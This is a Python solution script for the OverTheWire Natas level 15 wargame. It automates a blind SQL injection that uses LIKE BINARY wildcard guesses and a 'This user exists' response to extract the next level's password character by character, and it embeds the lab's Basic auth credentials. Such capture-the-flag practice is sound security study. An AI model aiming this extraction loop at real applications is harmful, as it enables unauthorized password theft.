#!/usr/bin/env python3

import requests
import json
import re
import base64
import sys

url = "http://natas15.natas.labs.overthewire.org/index.php?debug=true"
headers = {
"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language" : "en-US,en;q=0.5",
"Content-Type" : "application/x-www-form-urlencoded",
"Content-Length" : "39",
"Origin" : "http://natas15.natas.labs.overthewire.org",
"Authorization" : "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==",
"Connection" : "keep-alive",
"Referer" : "http://natas15.natas.labs.overthewire.org/index.php",
"Upgrade-Insecure-Requests" : "1",
"Host" : "natas15.natas.labs.overthewire.org"
}

legal_chars_string = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
body_string = "username=natas16\" and password like binary \""

example_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

def tryletter(prefix, letter):
    body_string_test = body_string + prefix + letter + "%"
    response = requests.post(url, data=body_string_test, headers=headers) #proxies = { "http" : "http://127.0.0.1:9090"})

    if re.search("This user exists", response.text):
        return True

    return False

def split(word):
    return [char for char in word]

legal_chars = split(legal_chars_string)
prefix = ""
while len(prefix) < len(example_password):
    for char in legal_chars:
        if tryletter(prefix, char):
            prefix += char
            break
    print("prefix: " + prefix)
